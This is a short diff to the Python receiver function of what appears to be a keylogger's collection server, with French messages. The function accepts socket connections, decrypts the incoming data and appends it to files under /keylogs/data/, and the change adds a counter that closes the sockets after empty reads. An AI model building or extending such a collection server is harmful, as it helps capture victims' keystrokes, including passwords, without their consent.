@@ -163,6 +163,8 @@ def receiver(port):
 
     print(f"Ecoute sur {SRV}:{port}")
 
+    buffer_time = 0;
+
     while True:
         client_socket, client_address = server_socket.accept()
 
@@ -170,13 +172,16 @@ def receiver(port):
         # recu data
         with open("/keylogs/data/" + ficname, "a") as f:
             data = client_socket.recv(1024)
-            if data:
+            if data :
                 f.write(dechiffrement(data))
                 print(f"\n{client_address} - ONLINE")
                 print("Update sur /keylogs/data/" + ficname)
-
-    client_socket.close()
-    server_socket.close()
+            else :
+                buffer_time = buffer_time + 1
+        if buffer_time == 2 :
+            client_socket.close()
+            server_socket.close()
+            return False
 
 
 if __name__ == '__main__':
